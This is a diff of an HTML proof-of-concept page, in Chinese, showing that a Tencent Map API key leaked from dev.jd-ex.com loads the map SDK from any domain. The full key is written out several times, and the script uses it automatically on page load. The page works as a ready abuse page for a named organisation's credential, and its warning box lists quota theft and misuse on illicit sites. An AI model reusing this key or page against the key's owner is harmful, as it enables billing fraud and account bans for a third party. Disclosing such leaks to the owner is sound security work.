@@ -6,231 +6,178 @@
     <title>PoC - 腾讯地图API Key 未授权引用漏洞验证</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0f1923;
-            color: #e0e0e0;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f1923; color: #e0e0e0; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
         .container { max-width: 900px; width: 100%; padding: 30px; }
-        .card {
-            background: #1a2836;
-            border-radius: 12px;
-            padding: 30px;
-            margin-bottom: 20px;
-            border: 1px solid #2a3a4a;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-        }
-        h1 {
-            font-size: 22px;
-            color: #ff6b6b;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .badge {
-            display: inline-block;
-            background: #ff4757;
-            color: #fff;
-            padding: 3px 10px;
-            border-radius: 4px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-        .info-grid {
-            display: grid;
-            grid-template-columns: auto 1fr;
-            gap: 8px 16px;
-            font-size: 14px;
-            margin: 15px 0;
-            padding: 15px;
-            background: #0f1923;
-            border-radius: 8px;
-        }
+        .card { background: #1a2836; border-radius: 12px; padding: 30px; margin-bottom: 20px; border: 1px solid #2a3a4a; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
+        h1 { font-size: 22px; color: #ff6b6b; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
+        .badge { display: inline-block; background: #ff4757; color: #fff; padding: 3px 10px; border-radius: 4px; font-size: 12px; font-weight: 600; }
+        .info-grid { display: grid; grid-template-columns: auto 1fr; gap: 8px 16px; font-size: 14px; margin: 15px 0; padding: 15px; background: #0f1923; border-radius: 8px; }
         .info-grid .label { color: #7f8fa6; }
         .info-grid .value { color: #dcdde1; word-break: break-all; font-family: 'Courier New', monospace; }
         .map-container { width: 100%; height: 450px; border-radius: 8px; overflow: hidden; border: 2px solid #2a3a4a; margin: 15px 0; }
         #map-container { width: 100%; height: 100%; }
-.status-bar { display: flex; gap: 15px; flex-wrap: wrap; margin: 15px 0; }
-        .status-item {
-            background: #0f1923; padding: 12px 18px; border-radius: 8px;
-            flex: 1; min-width: 150px; border-left: 3px solid #ff4757;
-        }
+        .status-bar { display: flex; gap: 15px; flex-wrap: wrap; margin: 15px 0; }
+        .status-item { background: #0f1923; padding: 12px 18px; border-radius: 8px; flex: 1; min-width: 150px; border-left: 3px solid #ff4757; }
         .status-item.success { border-left-color: #2ed573; }
         .status-item.warning { border-left-color: #ffa502; }
         .status-item .label { font-size: 11px; color: #7f8fa6; text-transform: uppercase; letter-spacing: 1px; }
         .status-item .val { font-size: 16px; font-weight: 600; margin-top: 4px; }
-        .danger-box {
-            background: #2d1b1b; border: 1px solid #ff4757; border-radius: 8px;
-            padding: 15px; font-size: 13px; color: #ff6b6b; margin-top: 15px;
-        }
-        .btn {
-            background: #ff4757; color: #fff; border: none; padding: 10px 24px;
-            border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600;
-        }
-        .log {
-            background: #0f1923; border-radius: 8px; padding: 12px;
-            font-family: 'Courier New', monospace; font-size: 12px; color: #7bed9f;
-            max-height: 150px; overflow-y: auto; margin-top: 10px; line-height: 1.8;
-        }
-        .log .error { color: #ff4757; }
-        .log .info { color: #70a1ff; }
-        .log .success { color: #2ed573; }
+        .btn { background: #ff4757; color: #fff; border: none; padding: 10px 24px; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600; }
+        .log { background: #0f1923; border-radius: 8px; padding: 12px; font-family: 'Courier New', monospace; font-size: 12px; color: #7bed9f; max-height: 150px; overflow-y: auto; margin-top: 10px; line-height: 1.8; }
+        .log .error { color: #ff4757; } .log .info { color: #70a1ff; } .log .success { color: #2ed573; }
+        .danger-box { background: #2d1b1b; border: 1px solid #ff4757; border-radius: 8px; padding: 15px; font-size: 13px; color: #ff6b6b; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <h1><span>🔓 PoC: 腾讯地图 API Key 未授权引用</span><span class="badge">高危</span></h1>
-            <p style="color: #7f8fa6; font-size: 14px; margin-bottom: 5px;">
-                验证从 <strong style="color: #ffa502;">dev.jd-ex.com</strong> 泄露的 API Key 可在任意第三方站点加载腾讯地图
-            </p>
-        </div>
+<div class="container">
+    <div class="card">
+        <h1><span>🔓 PoC: 腾讯地图 API Key 未授权引用</span><span class="badge">高危</span></h1>
+        <p style="color: #7f8fa6; font-size: 14px;">验证从 <strong style="color: #ffa502;">dev.jd-ex.com</strong> 泄露的 API Key 可在任意第三方站点加载腾讯地图</p>
+    </div>
 
-        <div class="card">
-            <h1 style="font-size: 16px; color: #ff6b6b;">🔑 泄露的 Key</h1>
+    <div class="card">
+        <h1 style="font-size: 16px; color: #ff6b6b;">🔑 泄露的 Key</h1>
         <div class="key-display" style="background:#1a1a2e;border:1px dashed #ff4757;border-radius:6px;padding:12px 16px;font-family:'Courier New',monospace;font-size:14px;color:#ff6b6b;text-align:center;margin:10px 0;word-break:break-all;">7RJBZ-O6I64-XANUL-KKPHS-UOCAJ-EPFPU</div>
-            <div class="info-grid">
-                <span class="label">Key 类型</span><span class="value">JavaScript API Key</span>
-                <span class="label">来源</span><span class="value">https://dev.jd-ex.com/manager/</span>
-                <span class="label">Referer 限制</span><span class="value" style="color: #ff4757;">⚠️ 无限制（任意域名可用）</span>
-                <span class="label">服务商</span><span class="value">腾讯地图 (lbs.qq.com)</span>
-            </div>
-        </div>
-
-        <div class="card">
-            <h1 style="font-size: 16px; color: #2ed573;">🗺️ 地图加载验证</h1>
-            <p style="font-size: 13px; color: #7f8fa6; margin-bottom: 10px;">
-                以下地图使用泄露的 Key 在 <span style="color: #ff6b6b;">第三方域名</span> 上加载
-            </p>
-            <div class="status-bar">
-                <div class="status-item" id="status-key"><div class="label">Key 可用性</div><div class="val">检测中...</div></div>
-                <div class="status-item" id="status-map"><div class="label">地图状态</div><div class="val">等待加载...</div></div>
-                <div class="status-item" id="status-referer"><div class="label">Referer 检查</div><div class="val">检测中...</div></div>
-            </div>
-            <div class="map-container"><div id="map-container"></div></div>
-            <button class="btn" onclick="loadMap()">🔄 重新加载地图</button>
-        </div>
-
-        <div class="card">
-            <h1 style="font-size: 16px; color: #ffa502;">📋 漏洞验证结果</h1>
-            <div id="verify-result"><p style="color: #7f8fa6; font-size: 13px;">等待地图加载完成...</p></div>
-            <div id="log" class="log">
-                <div class="info">[INFO] PoC 页面已启动</div>
-        <div class="info">[INFO] 正在加载腾讯地图 SDK...</div>
-            </div>
-            <div class="danger-box">
-                <strong>⚠️ 危害说明</strong><br><br>
-                <strong>1. 配额盗刷</strong> — 此 Key 无 Referer 白名单，可在任意网站加载腾讯地图，消耗对方免费额度（2.5万次/天）。超出后按 0.14元/次 计费，可直接造成经济损失。<br><br>
-                <strong>2. 违规使用</strong> — 黑灰产可将此 Key 嵌入赌博、色情等违规站点，导致 Key 所属账号被腾讯封禁。<br><br>
-                <strong>3. 关联泄露</strong> — Key 所属的 AppID 可能关联到其他业务线，扩大攻击面。
-            </div>
-        </div>
-        <div class="footer" style="text-align:center;color:#57606f;font-size:12px;margin-top:20px;">
-            PoC for educational & security research purposes only
+        <div class="info-grid">
+            <span class="label">Key 类型</span><span class="value">JavaScript API Key</span>
+            <span class="label">来源</span><span class="value">https://dev.jd-ex.com/manager/</span>
+            <span class="label">Referer 限制</span><span class="value" style="color: #ff4757;">⚠️ 无限制（任意域名可用）</span>
+            <span class="label">服务商</span><span class="value">腾讯地图 (lbs.qq.com)</span>
         </div>
     </div>
 
-    <script>
-        const LEAKED_KEY = '7RJBZ-O6I64-XANUL-KKPHS-UOCAJ-EPFPU';
+    <div class="card">
+        <h1 style="font-size: 16px; color: #2ed573;">🗺️ 地图加载验证</h1>
+        <p style="font-size: 13px; color: #7f8fa6; margin-bottom: 10px;">以下地图使用泄露的 Key 在 <span style="color: #ff6b6b;">第三方域名</span> 上加载</p>
+        <div class="status-bar">
+            <div class="status-item" id="status-key"><div class="label">Key 可用性</div><div class="val">检测中...</div></div>
+            <div class="status-item" id="status-map"><div class="label">地图状态</div><div class="val">等待加载...</div></div>
+            <div class="status-item" id="status-referer"><div class="label">Referer 检查</div><div class="val">检测中...</div></div>
+        </div>
+        <div class="map-container"><div id="map-container"></div></div>
+        <button class="btn" onclick="loadMap()">🔄 重新加载地图</button>
+    </div>
 
-        function log(msg, type = 'info') {
-            const el = document.getElementById('log');
-            const div = document.createElement('div');
-            div.className = type;
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            el.appendChild(div);
-            el.scrollTop = el.scrollHeight;
+    <div class="card">
+        <h1 style="font-size: 16px; color: #ffa502;">📋 漏洞验证结果</h1>
+        <div id="verify-result"><p style="color: #7f8fa6; font-size: 13px;">等待地图加载完成...</p></div>
+        <div id="log" class="log">
+            <div class="info">[INFO] PoC 页面已启动</div>
+            <div class="info">[INFO] 正在加载腾讯地图 SDK...</div>
+        </div>
+        <div class="danger-box">
+            <strong>⚠️ 危害说明</strong><br><br>
+            <strong>1. 配额盗刷</strong> — 此 Key 无 Referer 白名单，可在任意网站加载腾讯地图，消耗对方免费额度（2.5万次/天）。超出后按 0.14元/次 计费。<br><br>
+            <strong>2. 违规使用</strong> — 黑灰产可将此 Key 嵌入违规站点，导致账号被腾讯封禁。<br><br>
+            <strong>3. 关联泄露</strong> — Key 所属的 AppID 可能关联到其他业务线。
+        </div>
+    </div>
+    <div class="footer" style="text-align:center;color:#57606f;font-size:12px;margin-top:20px;">PoC for educational & security research purposes only</div>
+</div>
+
+<script>
+const LEAKED_KEY = '7RJBZ-O6I64-XANUL-KKPHS-UOCAJ-EPFPU';
+
+function log(msg, type = 'info') {
+    const el = document.getElementById('log');
+    const div = document.createElement('div');
+    div.className = type;
+    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    el.appendChild(div);
+    el.scrollTop = el.scrollHeight;
+}
+
+function setStatus(id, label, status) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.className = 'status-item ' + status;
+    el.querySelector('.val').textContent = label;
+}
+
+function setResult(html) {
+    document.getElementById('verify-result').innerHTML = html;
+}
+
+function clearMap() {
+    document.getElementById('map-container').innerHTML = '';
+    setStatus('status-map', '已卸载', 'warning');
+    log('地图已卸载', 'warning');
+}
+
+function loadMap() {
+    document.getElementById('map-container').innerHTML = '';
+    setStatus('status-key', '验证中...', '');
+    setStatus('status-map', '加载中...', '');
+    setStatus('status-referer', '检测中...', '');
+    setResult('<p style="color: #ffa502;">⏳ 正在加载地图...</p>');
+    log('正在加载 Tencent Map SDK...', 'info');
+
+    if (typeof qq !== 'undefined' && qq.maps) {
+        log('SDK 已加载', 'success');
+        initMap();
+        return;
+    }
+
+    // ✅ 使用 callback 模式（腾讯地图官方推荐）
+    const callbackName = 'tencentMapCallback_' + Date.now();
+    window[callbackName] = function() {
+        log('qq.maps 命名空间已就绪（callback）', 'success');
+        setStatus('status-key', 'Key 可用 ✅', 'success');
+        setStatus('status-referer', '无 Referer 限制 ⚠️', 'warning');
+        initMap();
+    };
+
+    const script = document.createElement('script');
+    script.src = `https://map.qq.com/api/js?v=2.exp&key=${LEAKED_KEY}&callback=${callbackName}`;
+    script.async = true;
+    script.onerror = function() {
+        log('❌ SDK 加载失败', 'error');
+        setStatus('status-key', '加载失败', '');
+    };
+    document.head.appendChild(script);
+    log('正在注入 SDK（callback模式）: map.qq.com/api/js?v=2.exp...', 'info');
+
+    setTimeout(function() {
+        if (typeof qq === 'undefined') {
+            log('⚠️ callback 超时', 'error');
+            setStatus('status-map', '加载超时', '');
         }
+    }, 15000);
+}
 
-        function setStatus(id, label, status) {
-            const el = document.getElementById(id);
-            if (!el) return;
-            el.className = 'status-item ' + status;
-            el.querySelector('.val').textContent = label;
-        }
+function initMap() {
+    try {
+        const center = new qq.maps.LatLng(39.916527, 116.397128);
+        const map = new qq.maps.Map(document.getElementById('map-container'), {
+        center: center, zoom: 13
+        });
+        new qq.maps.Marker({ position: center, map: map, title: '验证标记' });
 
-        function setResult(html) {
-            document.getElementById('verify-result').innerHTML = html;
-        }
+        const info = new qq.maps.InfoWindow({
+            map: map, position: center,
+            content: '<div style="padding:8px;font-size:13px;color:#333;">✅ 使用泄露的 Key 加载成功<br><span style="font-size:11px;color:#999;">Key: ' + LEAKED_KEY.substring(0,10) + '...' + LEAKED_KEY.slice(-4) + '</span></div>'
+        });
+        info.open();
 
-        function loadMap() {
-            document.getElementById('map-container').innerHTML = '';
-            setStatus('status-key', '验证中...', '');
-            setStatus('status-map', '加载中...', '');
-            setStatus('status-referer', '检测中...', '');
-            setResult('<p style="color: #ffa502;">⏳ 正在加载地图...</p>');
-            log('正在加载 Tencent Map SDK...', 'info');
+        log('✅ 地图渲染成功！', 'success');
+        setStatus('status-map', '加载成功 ✅', 'success');
 
-            if (typeof qq !== 'undefined' && qq.maps) {
-                log('SDK 已加载', 'success');
-            initMap();
-                return;
-            }
-
-            const script = document.createElement('script');
-            script.src = `https://map.qq.com/api/gljs?v=2.exp&key=${LEAKED_KEY}`;
-            script.async = true;
-
-            script.onload = function() {
-                log('✅ SDK 加载成功！', 'success');
-                setStatus('status-key', 'Key 可用 ✅', 'success');
-                setStatus('status-referer', '无 Referer 限制 ⚠️', 'warning');
-
-                var checkQQ = setInterval(function() {
-                    if (typeof qq !== 'undefined' && qq.maps) {
-                        clearInterval(checkQQ);
-                        log('qq.maps 已就绪', 'success');
-                        initMap();
-                    }
-                }, 200);
-                setTimeout(function() {
-                    clearInterval(checkQQ);
-                    if (typeof qq === 'undefined') {
-                        log('❌ qq 命名空间超时', 'error');
-                    }
-                }, 10000);
-            };
-
-            script.onerror = function() {
-                log('❌ SDK 加载失败', 'error');
-                setStatus('status-key', '加载失败', '');
-            };
-
-            document.head.appendChild(script);
-        }
-
-        function initMap() {
-            try {
-                const center = new qq.maps.LatLng(39.916527, 116.397128);
-                new qq.maps.Map(document.getElementById('map-container'), {
-                    center: center, zoom: 13
-                });
-                new qq.maps.Marker({ position: center, map: map, title: '验证标记' });
-
-                log('✅ 地图渲染成功！', 'success');
-                log('📍 已使用泄露的 Key 加载腾讯地图', 'success');
-                log('⚠️ Key 无 Referer 限制', 'warning');
-                setStatus('status-map', '加载成功 ✅', 'success');
         setResult(`
-                    <div style="background:#0f1923;border-radius:8px;padding:15px;">
-                        <p style="color:#2ed573;font-size:15px;font-weight:600;">✅ 漏洞验证成功</p>
-                        <p style="color:#dcdde1;font-size:13px;margin-top:8px;">
-                            Key <strong style="color:#ff6b6b;">${LEAKED_KEY}</strong>
-                            可在任意第三方网站加载腾讯地图
-                        </p>
-                    </div>
-                `);
-            } catch(e) {
-                log('❌ 地图初始化失败: ' + e.message, 'error');
-            }
-        }
+            <div style="background:#0f1923;border-radius:8px;padding:15px;">
+                <p style="color:#2ed573;font-size:15px;font-weight:600;">✅ 漏洞验证成功</p>
+                <p style="color:#dcdde1;font-size:13px;margin-top:8px;">
+                    泄露的 API Key <strong style="color:#ff6b6b;">${LEAKED_KEY}</strong>
+                    可在任意第三方网站加载腾讯地图，无 Referer 白名单限制。
+                </p>
+            </div>
+        `);
+    } catch(e) {
+        log('❌ 地图初始化失败: ' + e.message, 'error');
+        setStatus('status-map', '初始化失败', '');
+    }
+}
 
-        window.onload = function() { setTimeout(loadMap, 500); };
-    </script>
+window.onload = function() { setTimeout(loadMap, 500); };
+</script>
 </body>
 </html>
